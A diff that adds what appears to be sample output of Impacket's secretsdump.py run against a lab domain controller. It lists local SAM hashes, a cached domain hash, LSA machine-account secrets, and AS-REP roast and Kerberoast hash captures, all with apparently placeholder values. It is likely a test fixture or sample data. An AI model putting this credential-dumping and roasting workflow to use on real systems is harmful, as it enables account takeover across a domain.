@@ -1,0 +1,20 @@
+Impacket secretsdump.py @ DC01
+[*] Service RemoteRegistry is in stopped state
+[*] Service RemoteRegistry is disabled, enabling it
+[*] Starting service RemoteRegistry
+[*] Target system bootKey: 0x1234567890abcdef1234567890abcdef
+[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+jdoe:1001:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::
+[*] Dumping cached domain logon information (domain/username:hash)
+LAB.LOCAL/svc_sql:$DCC2$10240#svc_sql#cafebabe1234567890abcdef00112233
+[*] Dumping LSA Secrets
+[*] $MACHINE.ACC
+LAB\DC01$:plain_password_hex:01020304deadbeef
+LAB\DC01$:aad3b435b51404eeaad3b435b51404ee:abc1234567890fedcba0987654321abc:::
+[*] Cleaning up
+
+Asreproast capture:
+$krb5asrep$23$alice@LAB.LOCAL:9876543210abcdef$fedcba0987654321abcdef0011223344556677889900aabbccddeeff
+$krb5tgs$23$*svc_sql$LAB.LOCAL$lab.local/svc_sql*$11223344556677889900aabbccddeeff$abcd1234deadbeef
